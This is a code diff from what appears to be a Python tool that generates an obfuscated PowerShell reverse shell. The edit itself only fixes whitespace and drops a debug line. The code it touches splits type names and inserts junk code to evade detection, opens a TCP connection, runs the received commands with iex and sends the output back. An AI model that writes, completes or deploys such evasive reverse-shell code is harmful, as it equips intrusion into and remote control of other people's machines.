@@ -46,7 +46,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     # --- The Correct, Fully Obfuscated Reverse Shell ---
     tcpclient_str = split_string('System.Net.Sockets.TCPClient')
     asciiencoding_str = split_string('System.Text.ASCIIEncoding')
-
+    
     core_shell = (
         junk_code() +
         f"${var['tcpclient']}_typename = {tcpclient_str}\n"
@@ -56,7 +56,6 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
         f"    ${{var['data']}} = (New-Object -TypeName ([string]{asciiencoding_str})).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
         f"    ${{var['data']}} = ${{var['data']}}.Trim()\n"
-        Write-Host "DEBUG CMD: [$(${var['data']})]"
         f"    if (${{var['data']}}.Length -gt 0) {{\n"
         f"        ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
         f"        ${{var['sendback2']}} = ${{{var['sendback']}}} + 'PS ' + (pwd).Path + '> '\n"
